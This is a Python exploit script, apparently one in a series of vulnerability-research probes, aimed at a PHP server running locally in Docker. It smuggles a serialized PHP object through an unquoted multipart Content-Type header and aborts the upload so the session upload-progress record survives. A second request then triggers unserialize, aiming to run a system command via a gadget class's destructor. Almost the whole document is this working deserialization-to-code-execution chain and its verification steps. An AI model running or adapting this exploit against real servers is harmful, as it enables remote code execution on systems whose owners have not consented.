#!/usr/bin/env python3
"""up3: CVE-2026-115560 probe #3 — payload via part Content-Type (no quoting).

up2 learned:
- abandoned php_binary progress record survives client abort ✓
- php-handler decode of record fails clean when record has no '|' ✓
- filename is quote-truncated (s:205 = 200 x + '|O:9:') -> dead vector

This probe: the record stores the part's raw Content-Type (up2 dump:
s:24:"application/octet-stream"). Content-Type headers are NOT quoted,
so '|' and '"' ride verbatim. Layout so the FIRST '|' in the whole
record is ours: filename stays clean (no '|'), then
  s:NN:"x|O:9:"GadgetPwn":0:{}|"
php-decode: key = prefix garbage, value = O:9:"GadgetPwn":0:{}|...
unserialize -> GadgetPwn->__destruct -> system(id) > /tmp/x_gadget.
"""
import socket, subprocess, urllib.request, uuid, time

HOST, PORT = "127.0.0.1", 8086
SID = uuid.uuid4().hex
P = "probe3"
CT = 'x|O:9:"GadgetPwn":0:{}|'

def dump_sess():
    r = subprocess.run(["docker", "exec", "php_up", "cat", "/tmp/sess_" + SID],
                       capture_output=True, timeout=20)
    return r.stdout

def xg():
    r = subprocess.run(["docker", "exec", "php_up", "sh",
                        "-c", "cat /tmp/x_gadget 2>/dev/null || echo NO_XG"],
                       capture_output=True, timeout=20)
    return r.stdout.decode("latin1", "replace").strip()

print("SID", SID, flush=True)

body_head = (
    "------up3\r\n"
    "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
    + P + "\r\n"
    "------up3\r\n"
    "Content-Disposition: form-data; name=\"f\"; filename=\"ok.txt\"\r\n"
    "Content-Type: " + CT + "\r\n\r\n"
).encode("latin1")
body_tail = b"\r\n------up3--\r\n"
TOTAL = 4_000_000
req = (
    "POST /target.php HTTP/1.1\r\n"
    "Host: 127.0.0.1:8086\r\n"
    "Cookie: PHPSESSID=" + SID + "\r\n"
    "Content-Type: multipart/form-data; boundary=----up3\r\n"
    "Content-Length: " + str(len(body_head) + TOTAL + len(body_tail)) + "\r\n"
    "\r\n"
).encode()
s = socket.create_connection((HOST, PORT), timeout=30)
s.sendall(req + body_head)
sent = 0
pad = b"P" * 65536
while sent < TOTAL // 2:
    n = min(len(pad), TOTAL // 2 - sent)
    s.sendall(pad[:n]); sent += n
s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
s.close()
print("A: aborted after", sent, "bytes", flush=True)
time.sleep(1)

raw = dump_sess()
print("A: sess len", len(raw), flush=True)
if raw:
    print("A: latin1:", raw.decode("latin1", "replace"), flush=True)
    print("A: has GadgetPwn:", b"GadgetPwn" in raw, flush=True)

rq = urllib.request.Request("http://127.0.0.1:8086/gadget.php",
                            headers={"Cookie": "PHPSESSID=" + SID})
try:
    with urllib.request.urlopen(rq, timeout=60) as r:
        print("B:", r.status, flush=True)
        print(r.read().decode("latin1", "replace")[:800], flush=True)
except Exception as e:
    print("B: ERR", str(e)[:300], flush=True)

print("C: /tmp/x_gadget ->", xg(), flush=True)
